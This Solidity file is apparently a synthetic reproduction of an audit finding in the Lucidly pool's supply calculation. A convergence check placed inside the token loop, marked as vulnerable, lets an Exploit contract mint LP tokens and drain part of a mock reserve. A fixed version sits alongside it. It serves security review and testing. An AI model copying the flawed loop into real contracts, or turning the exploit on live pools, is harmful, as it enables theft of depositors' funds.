// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Lucidly Pool._calculateSupply — the token loop does not end before delta
    (Pashov Audit Group, Lucidly security review, finding H-09).

    SYNTHETIC, cheatcode-free reduction. The quoted update and the bracket
    the report moves are preserved. yETH computes r for every token, then
    delta once. Here delta sits inside the token loop, so the second token
    sees s == sp and returns D = 1100e18. That mints 200 LP against a 1000
    reserve and pays 2000/11 of the reserve to a depositor who added nothing.

    run() does not warp. Nothing in the path reads block.timestamp. */

library FixedPointMathLib {
    function rawMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function rawDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LpToken {
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function setMinter(address minter_) external {
        require(minter == address(0), "minter");
        minter = minter_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract Pool {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant MAX_POW_REL_ERR = 100;

    Asset public token;
    LpToken public lp;
    uint256 public supply;
    uint256 public reserve;
    uint256 public lastDelta;
    uint256 public minted;
    uint256 public paid;

    constructor(Asset token_, LpToken lp_) {
        token = token_;
        lp = lp_;
        lp.setMinter(address(this));
    }

    function seed() external {
        require(supply == 0, "seeded");
        supply = 900 ether;
        reserve = 1000 ether;
        token.mint(address(this), 1000 ether);
        lp.mint(address(this), 900 ether);
    }

    function syncAndWithdraw(address to) external returns (uint256) {
        (uint256 nextSupply,) = _calculateSupply(2, supply, 2 ether, 1 ether, 1000 ether);
        minted = nextSupply - supply;
        supply = nextSupply;
        lp.mint(to, minted);
        paid = reserve * minted / supply;
        reserve -= paid;
        token.transfer(to, paid);
        return paid;
    }

    function _calculateSupply(
        uint256 numTokens_,
        uint256 supply_,
        uint256 amplification_,
        uint256 virtualBalanceProd_,
        uint256 virtualBalanceSum_
    ) internal returns (uint256, uint256) {
        uint256 _l = amplification_;
        uint256 _d = _l - PRECISION;
        _l = FixedPointMathLib.rawMul(_l, virtualBalanceSum_);
        uint256 _s = supply_;
        uint256 _r = virtualBalanceProd_;
        for (uint256 iter = 0; iter < 4; ++iter) {
            uint256 _sp = (_l - FixedPointMathLib.rawMul(_s, _r)) / _d;
            for (uint256 t = 0; t < 32; t++) {
                if (t == numTokens_) break;
                _r = FixedPointMathLib.rawDiv(FixedPointMathLib.rawMul(_s, _sp), _s);
                uint256 _delta;
                if (_sp >= _s) _delta = _sp - _s;
                else _delta = _s - _sp;
                // @> VULN: delta is inside the token loop; yETH ends that loop before delta = 0
                if (FixedPointMathLib.rawDiv(FixedPointMathLib.rawMul(_delta, PRECISION), _s) <= MAX_POW_REL_ERR) {
                    return (_sp, _r);
                }
                lastDelta = _delta;
                _s = _sp;
            }
        }
        return (_s, _r);
    }
}

contract PoolFixed {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant MAX_POW_REL_ERR = 100;
    uint256 public lastDelta;

    function calculate() external returns (uint256) {
        uint256 _l = uint256(2 ether);
        uint256 _d = _l - PRECISION;
        _l = _l * uint256(1000 ether);
        uint256 _s = 900 ether;
        uint256 _r = 1 ether;
        for (uint256 iter = 0; iter < 4; ++iter) {
            uint256 _sp = (_l - _s * _r) / _d;
            for (uint256 t = 0; t < 32; t++) {
                if (t == 2) break;
                _r = FixedPointMathLib.rawDiv(FixedPointMathLib.rawMul(_s, _sp), _s);
            }
            uint256 _delta;
            if (_sp >= _s) _delta = _sp - _s;
            else _delta = _s - _sp;
            lastDelta = _delta;
            if (FixedPointMathLib.rawDiv(FixedPointMathLib.rawMul(_delta, PRECISION), _s) <= MAX_POW_REL_ERR) {
                return _sp;
            }
            _s = _sp;
        }
        return _s;
    }
}

contract Exploit {
    uint256 public constant PAID = 181818181818181818181;
    uint256 public constant MINTED = 200 ether;
    uint256 public constant FAIR_RESERVE_LEFT = 1000 ether;

    Asset public token;
    LpToken public lp;
    Pool public pool;
    uint256 public paid;
    uint256 public mintedLp;

    constructor() {
        token = new Asset();
        lp = new LpToken();
        pool = new Pool(token, lp);
    }

    function run() external {
        pool.seed();
        paid = pool.syncAndWithdraw(address(this));
        mintedLp = lp.balanceOf(address(this));
        require(pool.supply() == 1100 ether, "supply");
        require(mintedLp == MINTED, "minted");
        require(paid == PAID, "paid");
        require(token.balanceOf(address(this)) == PAID, "balance");
        require(FAIR_RESERVE_LEFT - token.balanceOf(address(pool)) == PAID, "reserve");
        require(pool.reserve() == 1000 ether - PAID, "left");
    }
}
